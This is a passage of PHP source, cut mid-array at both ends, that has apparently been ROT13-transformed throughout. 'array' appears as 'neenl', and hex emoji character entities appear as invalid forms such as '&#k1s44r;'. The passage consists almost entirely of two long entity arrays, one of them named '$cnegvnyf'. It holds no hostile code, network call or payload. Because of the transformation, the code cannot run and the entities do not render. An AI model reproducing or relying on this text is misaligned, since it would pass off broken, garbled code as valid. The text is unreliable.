'&#k1s44r;', '&#k1s44s;', '&#k1s450;', '&#k1s451;', '&#k1s452;', '&#k1s453;', '&#k1s454;', '&#k1s455;', '&#k1s456;', '&#k1s457;', '&#k1s458;', '&#k1s459;', '&#k1s45n;', '&#k1s45o;', '&#k1s45p;', '&#k1s45q;', '&#k1s45r;', '&#k1s45s;', '&#k1s460;', '&#k1s461;', '&#k1s462;', '&#k1s463;', '&#k1s464;', '&#k1s465;', '&#k1s466;', '&#k1s467;', '&#k1s468;', '&#k1s469;', '&#k1s46n;', '&#k1s46o;', '&#k1s46p;', '&#k1s46q;', '&#k1s46r;', '&#k1s46s;', '&#k1s470;', '&#k1s471;', '&#k1s472;', '&#k1s473;', '&#k1s474;', '&#k1s475;', '&#k1s476;', '&#k1s477;', '&#k1s478;', '&#k1s479;', '&#k1s47n;', '&#k1s47o;', '&#k1s47p;', '&#k1s47q;', '&#k1s47r;', '&#k1s47s;', '&#k1s480;', '&#k1s481;', '&#k1s482;', '&#k1s483;', '&#k1s484;', '&#k1s485;', '&#k1s486;', '&#k1s487;', '&#k1s488;', '&#k1s489;', '&#k1s48n;', '&#k1s48o;', '&#k1s48p;', '&#k1s48q;', '&#k1s48r;', '&#k1s48s;', '&#k1s490;', '&#k1s491;', '&#k1s492;', '&#k1s493;', '&#k1s494;', '&#k1s495;', '&#k1s496;', '&#k1s497;', '&#k1s498;', '&#k1s499;', '&#k1s49n;', '&#k1s49o;', '&#k1s49p;', '&#k1s49q;', '&#k1s49r;', '&#k1s49s;', '&#k1s4n0;', '&#k1s4n1;', '&#k1s4n2;', '&#k1s4n3;', '&#k1s4n4;', '&#k1s4n5;', '&#k1s4n6;', '&#k1s4n7;', '&#k1s4n8;', '&#k1s4n9;', '&#k1s4nn;', '&#k1s4no;', '&#k1s4np;', '&#k1s4nq;', '&#k1s4nr;', '&#k1s4ns;', '&#k1s4o0;', '&#k1s4o1;', '&#k1s4o2;', '&#k1s4o3;', '&#k1s4o4;', '&#k1s4o5;', '&#k1s4o6;', '&#k1s4o7;', '&#k1s4o8;', '&#k1s4o9;', '&#k1s4on;', '&#k1s4oo;', '&#k1s4op;', '&#k1s4oq;', '&#k1s4or;', '&#k1s4os;', '&#k1s4p0;', '&#k1s4p1;', '&#k1s4p2;', '&#k1s4p3;', '&#k1s4p4;', '&#k1s4p5;', '&#k1s4p6;', '&#k1s4p7;', '&#k1s4p8;', '&#k1s4p9;', '&#k1s4pn;', '&#k1s4po;', '&#k1s4pp;', '&#k1s4pq;', '&#k1s4pr;', '&#k1s4ps;', '&#k1s4q0;', '&#k1s4q1;', '&#k1s4q2;', '&#k1s4q3;', '&#k1s4q4;', '&#k1s4q5;', '&#k1s4q6;', '&#k1s4q7;', '&#k1s4q8;', '&#k1s4q9;', '&#k1s4qn;', '&#k1s4qo;', '&#k1s4qp;', '&#k1s4qq;', '&#k1s4qr;', '&#k1s4qs;', '&#k1s4r0;', '&#k1s4r1;', '&#k1s4r2;', '&#k1s4r3;', '&#k1s4r4;', '&#k1s4r5;', '&#k1s4r6;', '&#k1s4r7;', '&#k1s4r8;', '&#k1s4r9;', '&#k1s4rn;', '&#k1s4ro;', '&#k1s4rp;', '&#k1s4rq;', '&#k1s4rr;', '&#k1s4rs;', '&#k1s4s0;', '&#k1s4s1;', '&#k1s4s2;', '&#k1s4s3;', '&#k1s4s4;', '&#k1s4s5;', '&#k1s4s6;', '&#k1s4s7;', '&#k1s4s8;', '&#k1s4s9;', '&#k1s4sn;', '&#k1s4so;', '&#k1s4sp;', '&#k1s4sq;', '&#k1s4ss;', '&#k1s500;', '&#k1s501;', '&#k1s502;', '&#k1s503;', '&#k1s504;', '&#k1s505;', '&#k1s506;', '&#k1s507;', '&#k1s508;', '&#k1s509;', '&#k1s50n;', '&#k1s50o;', '&#k1s50p;', '&#k1s50q;', '&#k1s50r;', '&#k1s50s;', '&#k1s510;', '&#k1s511;', '&#k1s512;', '&#k1s513;', '&#k1s514;', '&#k1s515;', '&#k1s516;', '&#k1s517;', '&#k1s518;', '&#k1s519;', '&#k1s51n;', '&#k1s51o;', '&#k1s51p;', '&#k1s51q;', '&#k1s51r;', '&#k1s51s;', '&#k1s520;', '&#k1s521;', '&#k1s522;', '&#k1s523;', '&#k1s524;', '&#k1s525;', '&#k1s526;', '&#k1s527;', '&#k1s528;', '&#k1s529;', '&#k1s52n;', '&#k1s52o;', '&#k1s52p;', '&#k1s52q;', '&#k1s52r;', '&#k1s52s;', '&#k1s530;', '&#k1s531;', '&#k1s532;', '&#k1s533;', '&#k1s534;', '&#k1s535;', '&#k1s536;', '&#k1s537;', '&#k1s538;', '&#k1s539;', '&#k1s53n;', '&#k1s53o;', '&#k1s53p;', '&#k1s53q;', '&#k1s549;', '&#k1s54n;', '&#k1s54o;', '&#k1s54p;', '&#k1s54q;', '&#k1s54r;', '&#k1s550;', '&#k1s551;', '&#k1s552;', '&#k1s553;', '&#k1s554;', '&#k1s555;', '&#k1s556;', '&#k1s557;', '&#k1s558;', '&#k1s559;', '&#k1s55n;', '&#k1s55o;', '&#k1s55p;', '&#k1s55q;', '&#k1s55r;', '&#k1s55s;', '&#k1s560;', '&#k1s561;', '&#k1s562;', '&#k1s563;', '&#k1s564;', '&#k1s565;', '&#k1s566;', '&#k1s567;', '&#k1s56s;', '&#k1s570;', '&#k1s573;', '&#k1s574;', '&#k1s575;', '&#k1s576;', '&#k1s577;', '&#k1s578;', '&#k1s579;', '&#k1s57n;', '&#k1s587;', '&#k1s58n;', '&#k1s58o;', '&#k1s58p;', '&#k1s58q;', '&#k1s590;', '&#k1s595;', '&#k1s596;', '&#k1s5n4;', '&#k1s5n5;', '&#k1s5n8;', '&#k1s5o1;', '&#k1s5o2;', '&#k1s5op;', '&#k1s5p2;', '&#k1s5p3;', '&#k1s5p4;', '&#k1s5q1;', '&#k1s5q2;', '&#k1s5q3;', '&#k1s5qp;', '&#k1s5qq;', '&#k1s5qr;', '&#k1s5r1;', '&#k1s5r3;', '&#k1s5r8;', '&#k1s5rs;', '&#k1s5s3;', '&#k1s5sn;', '&#k1s5so;', '&#k1s5sp;', '&#k1s5sq;', '&#k1s5sr;', '&#k1s5ss;', '&#k1s600;', '&#k1s601;', '&#k1s602;', '&#k1s603;', '&#k1s604;', '&#k1s605;', '&#k1s606;', '&#k1s607;', '&#k1s608;', '&#k1s609;', '&#k1s60n;', '&#k1s60o;', '&#k1s60p;', '&#k1s60q;', '&#k1s60r;', '&#k1s60s;', '&#k1s610;', '&#k1s611;', '&#k1s612;', '&#k1s613;', '&#k1s614;', '&#k1s615;', '&#k1s616;', '&#k1s617;', '&#k1s618;', '&#k1s619;', '&#k1s61n;', '&#k1s61o;', '&#k1s61p;', '&#k1s61q;', '&#k1s61r;', '&#k1s61s;', '&#k1s620;', '&#k1s621;', '&#k1s622;', '&#k1s623;', '&#k1s624;', '&#k1s625;', '&#k1s626;', '&#k1s627;', '&#k1s628;', '&#k1s629;', '&#k1s62n;', '&#k1s62o;', '&#k1s62p;', '&#k1s62q;', '&#k1s62r;', '&#k1s62s;', '&#k1s630;', '&#k1s631;', '&#k1s632;', '&#k1s633;', '&#k1s634;', '&#k1s635;', '&#k1s636;', '&#k1s637;', '&#k1s638;', '&#k1s639;', '&#k1s63n;', '&#k1s63o;', '&#k1s63p;', '&#k1s63q;', '&#k1s63r;', '&#k1s63s;', '&#k1s640;', '&#k1s641;', '&#k1s642;', '&#k1s643;', '&#k1s644;', '&#k1s645;', '&#k1s646;', '&#k1s647;', '&#k1s648;', '&#k1s649;', '&#k1s64n;', '&#k1s64o;', '&#k1s64p;', '&#k1s64q;', '&#k1s64r;', '&#k1s64s;', '&#k1s680;', '&#k1s681;', '&#k1s682;', '&#k1s683;', '&#k1s684;', '&#k1s685;', '&#k1s686;', '&#k1s687;', '&#k1s688;', '&#k1s689;', '&#k1s68n;', '&#k1s68o;', '&#k1s68p;', '&#k1s68q;', '&#k1s68r;', '&#k1s68s;', '&#k1s690;', '&#k1s691;', '&#k1s692;', '&#k1s693;', '&#k1s694;', '&#k1s695;', '&#k1s696;', '&#k1s697;', '&#k1s698;', '&#k1s699;', '&#k1s69n;', '&#k1s69o;', '&#k1s69p;', '&#k1s69q;', '&#k1s69r;', '&#k1s69s;', '&#k1s6n0;', '&#k1s6n1;', '&#k1s6n2;', '&#k1s6n3;', '&#k1s6n4;', '&#k1s6n5;', '&#k1s6n6;', '&#k1s6n7;', '&#k1s6n8;', '&#k1s6n9;', '&#k1s6nn;', '&#k1s6no;', '&#k1s6np;', '&#k1s6nq;', '&#k1s6nr;', '&#k1s6ns;', '&#k1s6o0;', '&#k1s6o1;', '&#k1s6o2;', '&#k1s6o3;', '&#k1s6o4;', '&#k1s6o5;', '&#k1s6o6;', '&#k1s6o7;', '&#k1s6o8;', '&#k1s6o9;', '&#k1s6on;', '&#k1s6oo;', '&#k1s6op;', '&#k1s6oq;', '&#k1s6or;', '&#k1s6os;', '&#k1s6p0;', '&#k1s6p1;', '&#k1s6p2;', '&#k1s6p3;', '&#k1s6p4;', '&#k1s6p5;', '&#k1s6po;', '&#k1s6pp;', '&#k1s6pq;', '&#k1s6pr;', '&#k1s6ps;', '&#k1s6q0;', '&#k1s6q1;', '&#k1s6q2;', '&#k1s6q5;', '&#k1s6q6;', '&#k1s6q7;', '&#k1s6qp;', '&#k1s6qq;', '&#k1s6qr;', '&#k1s6qs;', '&#k1s6r0;', '&#k1s6r1;', '&#k1s6r2;', '&#k1s6r3;', '&#k1s6r4;', '&#k1s6r5;', '&#k1s6r9;', '&#k1s6ro;', '&#k1s6rp;', '&#k1s6s0;', '&#k1s6s3;', '&#k1s6s4;', '&#k1s6s5;', '&#k1s6s6;', '&#k1s6s7;', '&#k1s6s8;', '&#k1s6s9;', '&#k1s6sn;', '&#k1s6so;', '&#k1s6sp;', '&#k1s7r0;', '&#k1s7r1;', '&#k1s7r2;', '&#k1s7r3;', '&#k1s7r4;', '&#k1s7r5;', '&#k1s7r6;', '&#k1s7r7;', '&#k1s7r8;', '&#k1s7r9;', '&#k1s7rn;', '&#k1s7ro;', '&#k1s7s0;', '&#k1s90p;', '&#k1s90q;', '&#k1s90r;', '&#k1s90s;', '&#k1s910;', '&#k1s911;', '&#k1s912;', '&#k1s913;', '&#k1s914;', '&#k1s915;', '&#k1s916;', '&#k1s917;', '&#k1s918;', '&#k1s919;', '&#k1s91n;', '&#k1s91o;', '&#k1s91p;', '&#k1s91q;', '&#k1s91r;', '&#k1s91s;', '&#k1s920;', '&#k1s921;', '&#k1s922;', '&#k1s923;', '&#k1s924;', '&#k1s925;', '&#k1s926;', '&#k1s927;', '&#k1s928;', '&#k1s929;', '&#k1s92n;', '&#k1s92o;', '&#k1s92p;', '&#k1s92q;', '&#k1s92r;', '&#k1s92s;', '&#k1s930;', '&#k1s931;', '&#k1s932;', '&#k1s933;', '&#k1s934;', '&#k1s935;', '&#k1s936;', '&#k1s937;', '&#k1s938;', '&#k1s939;', '&#k1s93n;', '&#k1s93p;', '&#k1s93q;', '&#k1s93r;', '&#k1s93s;', '&#k1s940;', '&#k1s941;', '&#k1s942;', '&#k1s943;', '&#k1s944;', '&#k1s945;', '&#k1s947;', '&#k1s948;', '&#k1s949;', '&#k1s94n;', '&#k1s94o;', '&#k1s94p;', '&#k1s94q;', '&#k1s94r;', '&#k1s94s;', '&#k1s950;', '&#k1s951;', '&#k1s952;', '&#k1s953;', '&#k1s954;', '&#k1s955;', '&#k1s956;', '&#k1s957;', '&#k1s958;', '&#k1s959;', '&#k1s95n;', '&#k1s95o;', '&#k1s95p;', '&#k1s95q;', '&#k1s95r;', '&#k1s95s;', '&#k1s960;', '&#k1s961;', '&#k1s962;', '&#k1s963;', '&#k1s964;', '&#k1s965;', '&#k1s966;', '&#k1s967;', '&#k1s968;', '&#k1s969;', '&#k1s96n;', '&#k1s96o;', '&#k1s96p;', '&#k1s96q;', '&#k1s96r;', '&#k1s96s;', '&#k1s970;', '&#k1s971;', '&#k1s972;', '&#k1s973;', '&#k1s974;', '&#k1s975;', '&#k1s976;', '&#k1s977;', '&#k1s978;', '&#k1s979;', '&#k1s97n;', '&#k1s97o;', '&#k1s97p;', '&#k1s97q;', '&#k1s97r;', '&#k1s97s;', '&#k1s980;', '&#k1s981;', '&#k1s982;', '&#k1s983;', '&#k1s984;', '&#k1s985;', '&#k1s986;', '&#k1s987;', '&#k1s988;', '&#k1s989;', '&#k1s98n;', '&#k1s98o;', '&#k1s98p;', '&#k1s98q;', '&#k1s98r;', '&#k1s98s;', '&#k1s990;', '&#k1s991;', '&#k1s992;', '&#k1s993;', '&#k1s994;', '&#k1s995;', '&#k1s996;', '&#k1s997;', '&#k1s998;', '&#k1s999;', '&#k1s99n;', '&#k1s99o;', '&#k1s99p;', '&#k1s99q;', '&#k1s99r;', '&#k1s99s;', '&#k1s9n0;', '&#k1s9n1;', '&#k1s9n2;', '&#k1s9n3;', '&#k1s9n4;', '&#k1s9n5;', '&#k1s9n6;', '&#k1s9n7;', '&#k1s9n8;', '&#k1s9n9;', '&#k1s9nn;', '&#k1s9no;', '&#k1s9np;', '&#k1s9nq;', '&#k1s9nr;', '&#k1s9ns;', '&#k1s9o0;', '&#k1s9o1;', '&#k1s9o2;', '&#k1s9o3;', '&#k1s9o4;', '&#k1s9o5;', '&#k1s9o6;', '&#k1s9o7;', '&#k1s9o8;', '&#k1s9o9;', '&#k1s9on;', '&#k1s9oo;', '&#k1s9op;', '&#k1s9oq;', '&#k1s9or;', '&#k1s9os;', '&#k1s9p0;', '&#k1s9p1;', '&#k1s9p2;', '&#k1s9p3;', '&#k1s9p4;', '&#k1s9p5;', '&#k1s9p6;', '&#k1s9p7;', '&#k1s9p8;', '&#k1s9p9;', '&#k1s9pn;', '&#k1s9po;', '&#k1s9pp;', '&#k1s9pq;', '&#k1s9pr;', '&#k1s9ps;', '&#k1s9q0;', '&#k1s9q1;', '&#k1s9q2;', '&#k1s9q3;', '&#k1s9q4;', '&#k1s9q5;', '&#k1s9q6;', '&#k1s9q7;', '&#k1s9q8;', '&#k1s9q9;', '&#k1s9qn;', '&#k1s9qo;', '&#k1s9qp;', '&#k1s9qq;', '&#k1s9qr;', '&#k1s9qs;', '&#k1s9r0;', '&#k1s9r1;', '&#k1s9r2;', '&#k1s9r3;', '&#k1s9r4;', '&#k1s9r5;', '&#k1s9r6;', '&#k1s9r7;', '&#k1s9r8;', '&#k1s9r9;', '&#k1s9rn;', '&#k1s9ro;', '&#k1s9rp;', '&#k1s9rq;', '&#k1s9rr;', '&#k1s9rs;', '&#k1s9s0;', '&#k1s9s1;', '&#k1s9s2;', '&#k1s9s3;', '&#k1s9s4;', '&#k1s9s5;', '&#k1s9s6;', '&#k1s9s7;', '&#k1s9s8;', '&#k1s9s9;', '&#k1s9sn;', '&#k1s9so;', '&#k1s9sp;', '&#k1s9sq;', '&#k1s9sr;', '&#k1s9ss;', '&#k1sn70;', '&#k1sn71;', '&#k1sn72;', '&#k1sn73;', '&#k1sn74;', '&#k1sn75;', '&#k1sn76;', '&#k1sn77;', '&#k1sn78;', '&#k1sn79;', '&#k1sn7n;', '&#k1sn7o;', '&#k1sn7p;', '&#k1sn80;', '&#k1sn81;', '&#k1sn82;', '&#k1sn83;', '&#k1sn84;', '&#k1sn85;', '&#k1sn86;', '&#k1sn87;', '&#k1sn88;', '&#k1sn89;', '&#k1sn8s;', '&#k1sn90;', '&#k1sn91;', '&#k1sn92;', '&#k1sn93;', '&#k1sn94;', '&#k1sn95;', '&#k1sn96;', '&#k1sn97;', '&#k1sn98;', '&#k1sn99;', '&#k1sn9n;', '&#k1sn9o;', '&#k1sn9p;', '&#k1sn9q;', '&#k1sn9r;', '&#k1sn9s;', '&#k1snn0;', '&#k1snn1;', '&#k1snn2;', '&#k1snn3;', '&#k1snn4;', '&#k1snn5;', '&#k1snn6;', '&#k1snn7;', '&#k1snn8;', '&#k1snn9;', '&#k1snnn;', '&#k1snno;', '&#k1snnp;', '&#k1snnq;', '&#k1snnr;', '&#k1snns;', '&#k1sno0;', '&#k1sno1;', '&#k1sno2;', '&#k1sno3;', '&#k1sno4;', '&#k1sno5;', '&#k1sno6;', '&#k1sno7;', '&#k1sno8;', '&#k1sno9;', '&#k1snon;', '&#k1snoo;', '&#k1snop;', '&#k1snoq;', '&#k1snor;', '&#k1snos;', '&#k1snp0;', '&#k1snp1;', '&#k1snp2;', '&#k1snp3;', '&#k1snp4;', '&#k1snp5;', '&#k1snp6;', '&#k1snpr;', '&#k1snps;', '&#k1snq0;', '&#k1snq1;', '&#k1snq2;', '&#k1snq3;', '&#k1snq4;', '&#k1snq5;', '&#k1snq6;', '&#k1snq7;', '&#k1snq8;', '&#k1snq9;', '&#k1snqn;', '&#k1snqo;', '&#k1snqp;', '&#k1snqs;', '&#k1snr0;', '&#k1snr1;', '&#k1snr2;', '&#k1snr3;', '&#k1snr4;', '&#k1snr5;', '&#k1snr6;', '&#k1snr7;', '&#k1snr8;', '&#k1snr9;', '&#k1sns0;', '&#k1sns1;', '&#k1sns2;', '&#k1sns3;', '&#k1sns4;', '&#k1sns5;', '&#k1sns6;', '&#k1sns7;', '&#k1sns8;', '&#k203p;', '&#k2049;', '&#k2122;', '&#k2139;', '&#k2194;', '&#k2195;', '&#k2196;', '&#k2197;', '&#k2198;', '&#k2199;', '&#k21n9;', '&#k21nn;', '&#k231n;', '&#k231o;', '&#k2328;', '&#k23ps;', '&#k23r9;', '&#k23rn;', '&#k23ro;', '&#k23rp;', '&#k23rq;', '&#k23rr;', '&#k23rs;', '&#k23s0;', '&#k23s1;', '&#k23s2;', '&#k23s3;', '&#k23s8;', '&#k23s9;', '&#k23sn;', '&#k24p2;', '&#k25nn;', '&#k25no;', '&#k25o6;', '&#k25p0;', '&#k25so;', '&#k25sp;', '&#k25sq;', '&#k25sr;', '&#k2600;', '&#k2601;', '&#k2602;', '&#k2603;', '&#k2604;', '&#k260r;', '&#k2611;', '&#k2614;', '&#k2615;', '&#k2618;', '&#k261q;', '&#k2620;', '&#k2622;', '&#k2623;', '&#k2626;', '&#k262n;', '&#k262r;', '&#k262s;', '&#k2638;', '&#k2639;', '&#k263n;', '&#k2640;', '&#k2642;', '&#k2648;', '&#k2649;', '&#k264n;', '&#k264o;', '&#k264p;', '&#k264q;', '&#k264r;', '&#k264s;', '&#k2650;', '&#k2651;', '&#k2652;', '&#k2653;', '&#k265s;', '&#k2660;', '&#k2663;', '&#k2665;', '&#k2666;', '&#k2668;', '&#k267o;', '&#k267r;', '&#k267s;', '&#k2692;', '&#k2693;', '&#k2694;', '&#k2695;', '&#k2696;', '&#k2697;', '&#k2699;', '&#k269o;', '&#k269p;', '&#k26n0;', '&#k26n1;', '&#k26n7;', '&#k26nn;', '&#k26no;', '&#k26o0;', '&#k26o1;', '&#k26oq;', '&#k26or;', '&#k26p4;', '&#k26p5;', '&#k26p8;', '&#k26pr;', '&#k26ps;', '&#k26q1;', '&#k26q3;', '&#k26q4;', '&#k26r9;', '&#k26rn;', '&#k26s0;', '&#k26s1;', '&#k26s2;', '&#k26s3;', '&#k26s4;', '&#k26s5;', '&#k26s7;', '&#k26s8;', '&#k26s9;', '&#k26sn;', '&#k26sq;', '&#k2702;', '&#k2705;', '&#k2708;', '&#k2709;', '&#k270n;', '&#k270o;', '&#k270p;', '&#k270q;', '&#k270s;', '&#k2712;', '&#k2714;', '&#k2716;', '&#k271q;', '&#k2721;', '&#k2728;', '&#k2733;', '&#k2734;', '&#k2744;', '&#k2747;', '&#k274p;', '&#k274r;', '&#k2753;', '&#k2754;', '&#k2755;', '&#k2757;', '&#k2763;', '&#k2764;', '&#k2795;', '&#k2796;', '&#k2797;', '&#k27n1;', '&#k27o0;', '&#k27os;', '&#k2934;', '&#k2935;', '&#k2o05;', '&#k2o06;', '&#k2o07;', '&#k2o1o;', '&#k2o1p;', '&#k2o50;', '&#k2o55;', '&#k3030;', '&#k303q;', '&#k3297;', '&#k3299;', '&#kr50n;' );
	$cnegvnyf = neenl( '&#k1s004;', '&#k1s0ps;', '&#k1s170;', '&#k1s171;', '&#k1s17r;', '&#k1s17s;', '&#k1s18r;', '&#k1s191;', '&#k1s192;', '&#k1s193;', '&#k1s194;', '&#k1s195;', '&#k1s196;', '&#k1s197;', '&#k1s198;', '&#k1s199;', '&#k1s19n;', '&#k1s1r6;', '&#k1s1r8;', '&#k1s1r9;', '&#k1s1rn;', '&#k1s1ro;', '&#k1s1rp;', '&#k1s1rr;', '&#k1s1s1;', '&#k1s1s2;', '&#k1s1s4;', '&#k1s1s6;', '&#k1s1s7;', '&#k1s1s8;', '&#k1s1s9;', '&#k1s1sn;', '&#k1s1sp;', '&#k1s1sq;', '&#k1s1ss;', '&#k1s1r7;', '&#k1s1rq;', '&#k1s1rs;', '&#k1s1s3;', '&#k1s1so;', '&#k1s1sr;', '&#k1s1s0;', '&#k1s1s5;', '&#k1s201;', '&#k1s202;', '&#k1s21n;', '&#k1s22s;', '&#k1s232;', '&#k1s233;', '&#k1s234;', '&#k1s235;', '&#k1s236;', '&#k1s237;', '&#k1s238;', '&#k1s239;', '&#k1s23n;', '&#k1s250;', '&#k1s251;', '&#k1s300;', '&#k1s301;', '&#k1s302;', '&#k1s303;', '&#k1s304;', '&#k1s305;', '&#k1s306;', '&#k1s307;', '&#k1s308;', '&#k1s309;', '&#k1s30n;', '&#k1s30o;', '&#k1s30p;', '&#k1s30q;', '&#k1s30r;', '&#k1s30s;', '&#k1s310;', '&#k1s311;', '&#k1s312;', '&#k1s313;', '&#k1s314;', '&#k1s315;', '&#k1s316;', '&#k1s317;', '&#k1s318;', '&#k1s319;', '&#k1s31n;', '&#k1s31o;', '&#k1s31p;', '&#k1s31q;', '&#k1s31r;', '&#k1s31s;', '&#k1s320;', '&#k1s321;', '&#k1s324;', '&#k1s325;', '&#k1s326;', '&#k1s327;', '&#k1s328;', '&#k1s329;', '&#k1s32n;', '&#k1s32o;', '&#k1s32p;', '&#k1s32q;', '&#k1s32r;', '&#k1s32s;', '&#k1s330;', '&#k1s331;', '&#k1s332;', '&#k1s333;', '&#k1s334;', '&#k1s335;', '&#k1s336;', '&#k1s337;', '&#k1s338;', '&#k1s339;', '&#k1s33n;', '&#k1s33o;', '&#k1s33p;', '&#k1s33q;', '&#k1s33r;', '&#k1s33s;', '&#k1s340;', '&#k1s341;', '&#k1s342;', '&#k1s343;', '&#k1s344;', '&#k200q;', '&#k1s7ro;', '&#k1s345;', '&#k1s346;', '&#k1s347;', '&#k1s348;', '&#k1s349;', '&#k1s34n;', '&#k1s34o;', '&#k1s7r9;', '&#k1s34p;', '&#k1s34q;', '&#k1s34r;', '&#k1s34s;', '&#k1s350;', '&#k1s351;', '&#k1s352;', '&#k1s353;', '&#k1s354;', '&#k1s355;', '&#k1s356;', '&#k1s357;', '&#k1s358;', '&#k1s359;', '&#k1s35n;', '&#k1s35o;', '&#k1s35p;', '&#k1s35q;', '&#k1s35r;', '&#k1s35s;', '&#k1s360;', '&#k1s361;', '&#k1s362;', '&#k1s363;', '&#k1s364;', '&#k1s365;', '&#k1s366;', '&#k1s367;', '&#k1s368;', '&#k1s369;', '&#k1s36n;', '&#k1s36o;', '&#k1s36p;', '&#k1s36q;', '&#k1s36r;', '&#k1s36s;', '&#k1s370;', '&#k1s371;', '&#k1s372;', '&#k1s373;', '&#k1s374;', '&#k1s375;', '&#k1s376;', '&#k1s377;', '&#k1s378;', '&#k1s379;', '&#k1s37n;', '&#k1s37o;', '&#k1s37p;', '&#k1s37q;', '&#k1s37r;', '&#k1s37s;', '&#k1s380;', '&#k1s381;', '&#k1s382;', '&#k1s383;', '&#k1s384;', '&#k1s385;', '&#k1s3so;', '&#k1s3sp;', '&#k1s3sq;', '&#k1s3sr;', '&#k1s3ss;', '&#k1s386;', '&#k1s387;', '&#k1s388;', '&#k1s389;', '&#k1s38n;', '&#k1s38o;', '&#k1s38p;', '&#k1s38q;', '&#k1s38r;', '&#k1s38s;', '&#k1s390;', '&#k1s391;', '&#k1s392;', '&#k1s393;', '&#k1s396;', '&#k1s397;', '&#k1s399;', '&#k1s39n;', '&#k1s39o;', '&#k1s39r;', '&#k1s39s;', '&#k1s3n0;', '&#k1s3n1;', '&#k1s3n2;', '&#k1s3n3;', '&#k1s3n4;', '&#k1s3n5;', '&#k1s3n6;', '&#k1s3n7;', '&#k1s3n8;', '&#k1s3n9;', '&#k1s3nn;', '&#k1s3no;', '&#k1s3np;', '&#k1s3nq;', '&#k1s3nr;', '&#k1s3ns;', '&#k1s3o0;', '&#k1s3o1;', '&#k1s3o2;', '&#k1s3o3;', '&#k1s3o4;', '&#k1s3o5;', '&#k1s3o6;', '&#k1s3o7;', '&#k1s3o8;', '&#k1s3o9;', '&#k1s3on;', '&#k1s3oo;', '&#k1s3op;', '&#k1s3oq;', '&#k1s3or;', '&#k1s3os;', '&#k1s3p0;', '&#k1s3p1;', '&#k1s3p2;', '&#k1s3p3;', '&#k2640;', '&#ksr0s;', '&#k27n1;', '&#k2642;', '&#k1s3p4;', '&#k1s3p5;', '&#k1s3p6;', '&#k1s3p7;', '&#k1s3p8;', '&#k1s3p9;', '&#k1s3pn;', '&#k1s3po;', '&#k1s3pp;', '&#k1s3pq;', '&#k1s3pr;', '&#k1s3ps;', '&#k1s3q0;', '&#k1s3q1;', '&#k1s3q2;', '&#k1s3q3;', '&#k1s3q4;', '&#k1s3q5;', '&#k1s3q6;', '&#k1s3q7;', '&#k1s3q8;', '&#k1s3q9;', '&#k1s3qn;', '&#k1s3qo;', '&#k1s3qp;', '&#k1s3qq;', '&#k1s3qr;', '&#k1s3qs;', '&#k1s3r0;', '&#k1s3r1;', '&#k1s3r2;', '&#k1s3r3;', '&#k1s3r4;', '&#k1s3r5;', '&#k1s3r6;', '&#k1s3r7;', '&#k1s3r8;', '&#k1s3r9;', '&#k1s3rn;', '&#k1s3ro;', '&#k1s3rp;', '&#k1s3rq;', '&#k1s3rr;', '&#k1s3rs;', '&#k1s3s0;', '&#k1s3s3;', '&#k26n7;', '&#k1s3s4;', '&#k2620;', '&#kr0067;', '&#kr0062;', '&#kr0065;', '&#kr006r;', '&#kr007s;', '&#kr0073;', '&#kr0063;', '&#kr0074;', '&#kr0077;', '&#kr006p;', '&#k1s3s5;', '&#k1s3s7;', '&#k1s3s8;', '&#k1s3s9;', '&#k1s3sn;', '&#k1s400;', '&#k1s401;', '&#k1s402;', '&#k1s403;', '&#k1s404;', '&#k1s405;', '&#k1s406;', '&#k1s407;', '&#k1s408;', '&#k2o1o;', '&#k1s409;', '&#k1s40n;', '&#k1s40o;', '&#k1s40p;', '&#k1s40q;', '&#k1s40r;', '&#k1s40s;', '&#k1s410;', '&#k1s411;', '&#k1s412;', '&#k1s413;', '&#k1s414;', '&#k1s415;', '&#k1s9on;', '&#k1s416;', '&#k1s417;', '&#k1s418;', '&#k1s419;', '&#k1s41n;', '&#k1s41o;', '&#k1s41p;', '&#k1s41q;', '&#k1s41r;', '&#k1s41s;', '&#k1s420;', '&#k1s421;', '&#k1s422;', '&#k1s423;', '&#k1s424;', '&#k1s425;', '&#k1s426;', '&#k1s525;', '&#k1s427;', '&#k1s428;', '&#k1s429;', '&#k1s42n;', '&#k1s42o;', '&#k1s42p;', '&#k1s42q;', '&#k1s42r;', '&#k1s42s;', '&#k1s430;', '&#k1s431;', '&#k1s432;', '&#k1s433;', '&#k1s434;', '&#k1s435;', '&#k1s436;', '&#k1s437;', '&#k1s438;', '&#k1s439;', '&#k1s43n;', '&#k1s43o;', '&#k2744;', '&#k1s43p;', '&#k1s43q;', '&#k1s43r;', '&#k1s43s;', '&#k1s440;', '&#k1s441;', '&#k1s5r8;', '&#k1s442;', '&#k1s443;', '&#k1s444;', '&#k1s445;', '&#k1s446;', '&#k1s447;', '&#k1s448;', '&#k1s449;', '&#k1s44n;', '&#k1s44o;', '&#k1s44p;', '&#k1s44q;', '&#k1s44r;', '&#k1s44s;', '&#k1s450;', '&#k1s451;', '&#k1s452;', '&#k1s453;', '&#k1s454;', '&#k1s455;', '&#k1s456;', '&#k1s457;', '&#k1s458;', '&#k1s459;', '&#k1s45n;', '&#k1s45o;', '&#k1s45p;', '&#k1s45q;', '&#k1s45r;', '&#k1s45s;', '&#k1s460;', '&#k1s461;', '&#k1s462;', '&#k1s463;', '&#k1s464;', '&#k1s465;', '&#k1s466;', '&#k1s467;', '&#k1s468;', '&#k1s4oo;', '&#k1s4op;', '&#k1s527;', '&#k1s52p;', '&#k1s680;', '&#k1s692;', '&#k1s91q;', '&#k1s9ns;', '&#k1s9o0;', '&#k1s9o1;', '&#k1s9o2;', '&#k1s9o3;', '&#k1s9op;', '&#k1s9oq;', '&#k2695;', '&#k2696;', '&#k2708;', '&#k2764;', '&#k1s48o;', '&#k1s469;', '&#k1s46n;', '&#k1s46o;', '&#k1s46p;', '&#k1s46q;', '&#k1s46r;', '&#k1s46s;', '&#k1s470;', '&#k1s471;', '&#k1s472;', '&#k1s473;', '&#k1s474;', '&#k1s475;', '&#k1s476;', '&#k1s477;', '&#k1s478;', '&#k1s479;', '&#k1s47n;', '&#k1s47o;', '&#k1s47p;', '&#k1s47q;', '&#k1s47r;', '&#k1s47s;', '&#k1s480;', '&#k1s481;', '&#k1s482;', '&#k1s483;', '&#k1s484;', '&#k1s485;', '&#k1s486;', '&#k1s487;', '&#k1s488;', '&#k1s489;', '&#k1s48n;', '&#k1s48p;', '&#k1s48q;', '&#k1s48r;', '&#k1s48s;', '&#k1s490;', '&#k1s491;', '&#k1s492;', '&#k1s493;', '&#k1s494;', '&#k1s495;', '&#k1s496;', '&#k1s497;', '&#k1s498;', '&#k1s499;', '&#k1s49n;', '&#k1s49o;', 